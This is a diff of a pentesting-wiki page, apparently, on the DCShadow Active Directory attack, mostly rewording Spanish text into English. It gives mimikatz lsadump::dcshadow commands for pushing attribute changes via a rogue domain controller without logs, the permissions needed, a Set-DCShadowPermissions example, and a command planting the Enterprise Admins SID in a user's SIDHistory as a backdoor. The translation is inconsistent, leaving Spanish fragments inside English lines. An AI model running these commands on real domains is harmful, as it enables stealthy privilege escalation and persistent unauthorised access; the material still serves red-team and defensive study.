@@ -2,7 +2,7 @@
 
 # DCShadow
 
-Registra un **nuevo Controlador de Dominio** en el AD y lo utiliza para **empujar atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **registro** sobre las **modificaciones**. **Necesitas privilegios de DA** y estar dentro del **dominio raíz**.\
+Registra un **nuevo Controlador de Dominio** en el AD y lo utiliza para **empujar atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **registro** sobre las **modificaciones**. Necesitas privilegios de **DA** y estar dentro del **dominio raíz**.\
 Ten en cuenta que si usas datos incorrectos, aparecerán registros bastante feos.
 
 Para realizar el ataque necesitas 2 instancias de mimikatz. Una de ellas iniciará los servidores RPC con privilegios de SYSTEM (aquí debes indicar los cambios que deseas realizar), y la otra instancia se utilizará para empujar los valores:
@@ -15,26 +15,26 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 ```bash:mimikatz2 (push) - Needs DA or similar
 lsadump::dcshadow /push
 ```
-Nota que **`elevate::token`** no funcionará en la sesión `mimikatz1` ya que eso eleva los privilegios del hilo, pero necesitamos elevar el **privilegio del proceso**.\
-También puedes seleccionar un objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
+You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Puedes enviar los cambios desde un DA o desde un usuario con estos permisos mínimos:
+You can push the changes from a DA or from a user with this minimal permissions:
 
-- En el **objeto de dominio**:
-- _DS-Install-Replica_ (Agregar/Quitar Réplica en Dominio)
+- In the **domain object**:
+- _DS-Install-Replica_ (Agregar/Eliminar Réplica en Dominio)
 - _DS-Replication-Manage-Topology_ (Gestionar Topología de Replicación)
 - _DS-Replication-Synchronize_ (Sincronización de Replicación)
-- El **objeto de Sitios** (y sus hijos) en el **contenedor de Configuración**:
-- _CreateChild y DeleteChild_
-- El objeto de la **computadora que está registrada como un DC**:
+- The **Sites object** (and its children) in the **Configuration container**:
+- _CreateChild and DeleteChild_
+- The object of the **computer which is registered as a DC**:
 - _WriteProperty_ (No Write)
-- El **objeto objetivo**:
+- The **target object**:
 - _WriteProperty_ (No Write)
 
-Puedes usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para otorgar estos privilegios a un usuario sin privilegios (ten en cuenta que esto dejará algunos registros). Esto es mucho más restrictivo que tener privilegios de DA.\
-Por ejemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Esto significa que el nombre de usuario _**student1**_ al iniciar sesión en la máquina _**mcorp-student1**_ tiene permisos de DCShadow sobre el objeto _**root1user**_.
+You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
+For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.
 
-## Usando DCShadow para crear puertas traseras
+## Using DCShadow to create backdoors
 ```bash:Set Enterprise Admins in SIDHistory to a user
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
